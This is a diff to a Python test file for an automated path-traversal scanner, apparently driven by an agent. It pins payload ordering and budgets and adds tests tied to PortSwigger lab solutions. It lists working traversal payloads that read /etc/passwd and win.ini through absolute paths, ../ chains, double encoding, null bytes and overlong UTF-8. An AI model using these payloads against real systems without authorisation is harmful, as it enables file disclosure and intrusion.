@@ -387,28 +387,47 @@ class TestProbeBudgetCoverage:
         memory = _memory_with_links()
         svc = PathTraversalScanner(runner, memory)
 
+        # Derived, not hardcoded: the matrix grew from 60 to 94 payloads when
+        # the absolute/prefixed/nullbyte filter-bypass classes were added, and
+        # a literal here would have to be chased every time it changes. What
+        # matters is the *split*, not the absolute size.
+        expected_full = len(
+            PathTraversalScanner(_make_runner({}), MagicMock())._build_payloads()
+        )
         svc.run_traversal_scan("http://example.com")
 
         commands = [c.args[0] for c in runner.run.call_args_list]
         observed = [c for c in commands if "filename=" in c and "/image?" in c]
         guess = [c for c in commands if "lang=" in c]
-        assert len(observed) == 60, f"observed param should get the full matrix, got {len(observed)}"
-        assert len(guess) == 12, f"blind guess should get the truncated set, got {len(guess)}"
+        assert len(observed) == expected_full, (
+            f"observed param should get the full matrix, got {len(observed)}")
+        assert len(guess) == 16, (
+            f"blind guess should get the truncated set, got {len(guess)}")
+        assert len(guess) < len(observed)
 
     def test_payload_order_is_encoding_class_major(self):
-        """Truncating a budget must keep plain `../` chains at every depth
-        rather than spending it all on depth-1's exotic encodings.
+        """Truncating a budget must keep the high-yield payloads rather than
+        spending it all on depth-1's exotic encodings.
+
+        The high-yield prefix is the `absolute` class (4 payloads - the only
+        thing that beats a filter rejecting traversal sequences outright) then
+        the plain `../` chains for both OS families at every depth (12), which
+        is exactly the 16-probe `max_guess_probes` default.
         """
         runner = _make_runner({})
         svc = PathTraversalScanner(runner, MagicMock())
 
         payloads = svc._build_payloads()
+        prefix = payloads[:16]
 
-        # The high-yield prefix is raw traversal for both OS families, all depths.
-        assert all("%" not in p for p in payloads[:12]), payloads[:12]
-        assert "../../../../../../etc/passwd" in payloads[:12]
-        # Encoded forms come afterwards, not interleaved into the prefix.
-        assert any("%2f" in p for p in payloads[12:])
+        assert "/etc/passwd" in prefix, prefix                     # absolute
+        assert "../../../../../../etc/passwd" in prefix, prefix    # raw, deepest
+        # Exotic encodings must not be interleaved into the prefix...
+        assert all("%c0%af" not in p and "%5c" not in p and "%252f" not in p
+                   for p in prefix), prefix
+        # ...but must still be present later in the list.
+        assert any("%c0%af" in p for p in payloads[16:])
+        assert any("%252f" in p for p in payloads[16:])
 
     @patch("app.tools.path_traversal.time.sleep")
     def test_confirmed_point_stops_consuming_its_budget(self, _sleep):
@@ -612,3 +631,113 @@ class TestUnreachableTarget:
         assert "TARGET UNREACHABLE" in report
         assert "No path-traversal vulnerabilities confirmed" not in report
         memory.add_finding.assert_not_called()
+
+
+class TestFilterBypassPayloadClasses:
+    """Live failure 2026-07-27: a PortSwigger lab whose `filename` parameter
+    was correctly discovered and swept with every payload of the time returned
+    no finding. `_build_payloads()` iterates `range(1, MAX_DEPTH + 1)`, so
+    EVERY payload it could emit began with at least one `../` - and the only
+    working value was a bare `/etc/passwd`, a string the generator could not
+    produce at any MAX_DEPTH setting.
+
+    These tests pin the three classes added to close that hole. Each asserts
+    the exact string the corresponding PortSwigger lab requires, so a future
+    refactor of the encoding matrix cannot silently drop one.
+    """
+
+    @staticmethod
+    def _payloads():
+        """Build the payload matrix with mirror sampling disabled.
+
+        Returns:
+            list[str]: The deterministic, generated-only payload set.
+        """
+        runner = MagicMock()
+        runner.run.return_value = ""          # `shuf` -> no mirror enrichment
+        return PathTraversalScanner(runner, MagicMock())._build_payloads()
+
+    def test_absolute_class_solves_absolute_path_bypass(self):
+        """Lab: traversal sequences blocked with absolute path bypass."""
+        assert "/etc/passwd" in self._payloads()
+
+    def test_absolute_class_covers_windows_and_encoding(self):
+        payloads = self._payloads()
+        assert "/windows/win.ini" in payloads
+        assert "%2fetc%2fpasswd" in payloads
+
+    def test_prefixed_class_solves_validation_of_start_of_path(self):
+        """Lab: file path traversal, validation of start of path."""
+        assert "/var/www/images/../../../etc/passwd" in self._payloads()
+
+    def test_nullbyte_class_solves_extension_validation(self):
+        """Lab: validation of file extension with null byte bypass."""
+        assert "../../../etc/passwd%00.png" in self._payloads()
+
+    def test_previously_covered_lab_payloads_are_not_regressed(self):
+        """The three original lab solutions must survive the reordering."""
+        payloads = self._payloads()
+        for required in (
+            "../../../etc/passwd",                       # simple case
+            "....//....//....//etc/passwd",              # stripped non-recursively
+            "..%252f..%252f..%252fetc%252fpasswd",       # superfluous URL-decode
+        ):
+            assert required in payloads, required
+
+    def test_absolute_class_is_probed_first(self):
+        """It is the cheapest class (4 payloads) and the only one that beats a
+        filter rejecting traversal sequences outright, so a truncated budget
+        must reach it."""
+        assert self._payloads()[0] == "/etc/passwd"
+
+    def test_matrix_is_deduplicated(self):
+        payloads = self._payloads()
+        assert len(payloads) == len(set(payloads))
+
+    def test_every_encoding_class_contributes_payloads(self):
+        """A class named in _ENCODING_CLASS_ORDER but never populated would be
+        a silent typo - the emit loop skips missing keys without error."""
+        from app.tools.path_traversal import _ENCODING_CLASS_ORDER
+
+        payloads = self._payloads()
+        markers = {
+            "absolute": "/etc/passwd",
+            "raw": "../etc/passwd",
+            "collapse": "....//etc/passwd",
+            "single": "..%2fetc%2fpasswd",
+            "double": "..%252fetc%252fpasswd",
+            "nullbyte": "../etc/passwd%00.png",
+            "prefixed": "/var/www/images/../etc/passwd",
+            "overlong": "..%c0%afetc/passwd",
+            "backslash": "..%5cwindows\\win.ini",
+        }
+        assert set(markers) == set(_ENCODING_CLASS_ORDER), "class list drifted"
+        for cls, marker in markers.items():
+            assert marker in payloads, f"class {cls} produced nothing ({marker})"
+
+    def test_guess_budget_default_covers_absolute_plus_full_raw_sweep(self):
+        """max_guess_probes must stay >= |absolute| + |raw| (4 + 12), or a
+        blind guess stops reaching depths 5-6 of the plain chain."""
+        import inspect
+
+        signature = inspect.signature(PathTraversalScanner.run_traversal_scan)
+        assert signature.parameters["max_guess_probes"].default == 16
+
+    def test_tool_registry_guess_budget_default_stays_in_sync(self):
+        """WSLBridgeTools.run_traversal_scan re-declares max_guess_probes, so
+        a stale value there silently overrides the scanner's own default on
+        every agent-initiated scan.
+
+        Read from source rather than imported: app.tools.tool_registry pulls in
+        command_runner -> paramiko, which is not a test dependency.
+        """
+        import pathlib
+        import re
+
+        source = (pathlib.Path(__file__).resolve().parents[2]
+                  / "app" / "tools" / "tool_registry.py").read_text(encoding="utf-8")
+        match = re.search(
+            r"def run_traversal_scan\([^)]*max_guess_probes=(\d+)", source, re.S)
+        assert match, "run_traversal_scan signature not found in tool_registry.py"
+        assert int(match.group(1)) == 16, (
+            f"tool_registry default is {match.group(1)}, scanner default is 16")
